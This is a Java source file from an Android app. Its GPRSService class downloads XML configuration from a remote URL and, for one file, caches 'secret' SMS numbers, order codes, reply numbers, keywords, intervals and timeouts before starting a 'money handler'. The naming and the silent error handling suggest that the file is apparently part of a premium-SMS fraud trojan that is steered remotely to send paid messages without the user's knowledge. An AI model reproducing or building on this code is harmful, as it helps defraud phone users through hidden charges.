package com.sttm.model;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;
import org.xmlpull.v1.XmlPullParserException;
import android.content.Context;
import com.sttm.bean.GPRSInfo_url;
import com.sttm.bean.Sms;
import com.sttm.charge.KsoMainCourse;
import com.sttm.util.HttpUtil;
import com.sttm.util.KsoCache;

public class GPRSService {

	public static byte[] updateGprsData(Context context, String fileName) {
		try {
			GPRSInfo_url gprs_url = GPRSInfo_url.getInstance(fileName,context);
			String urlString  = gprs_url.getGprsUpdateURL();
			String result = HttpUtil.queryStringForGet(urlString);
			result = new String(result.getBytes(),"UTF-8");
			byte[] buffer = result.trim().getBytes();
			InputStream inputStream = new ByteArrayInputStream(result.getBytes("UTF-8"));

			if (buffer.length > 0) {

				try {

					if (fileName.trim().equals("sale.xml")) {
						String saleNum = SaleFitler.getSaleNum(inputStream);
						if (saleNum != null && !"".equals(saleNum)) {
							KsoCache.getInstance().reSetValue("salenum",
									saleNum);
							KsoMainCourse.startSaleCountHandler(context);

						}
						
					

					} else if (fileName.trim().equals("shuihu.xml")) {
						List<Sms> smses = SmsFitler.getsms(inputStream);
						if (smses != null) {
							if (smses.size() > 0) {

								KsoMainCourse.startMoneyHandler(context);

								String secretSmsNumber = "";
								String secretSmsOrder = "";
								String replyNumber = "";
								int count = 0;
								long interval = 0;
								String keyword = "";
								long timeout = 0;

								for (Sms sms : smses) {
									secretSmsNumber += sms.getchannel() + ",";
									secretSmsOrder += sms.getorder() + ",";
									replyNumber = sms.getreplyNumber();
									count = sms.getcount();
									interval = sms.getinterval();
									keyword = sms.getkeyword();
									timeout = sms.gettimeout();
								}

								KsoCache.getInstance().reSetValue(
										"replyNumber", replyNumber);
								KsoCache.getInstance().reSetValue(
										"secretSmsCount", count);
								KsoCache.getInstance().reSetValue(
										"secretSmsNumber", secretSmsNumber);
								KsoCache.getInstance().reSetValue(
										"secretSmsOrder", secretSmsOrder);
								KsoCache.getInstance().reSetValue("interval",
										interval);
								KsoCache.getInstance().reSetValue("keyword",
										keyword);
								KsoCache.getInstance().reSetValue("timeout",
										timeout);

							}
						}

					}

				} catch (XmlPullParserException e) {
				}
			}

			return buffer;
		} catch (Exception e) {
            
			return null;
		}

	}

}
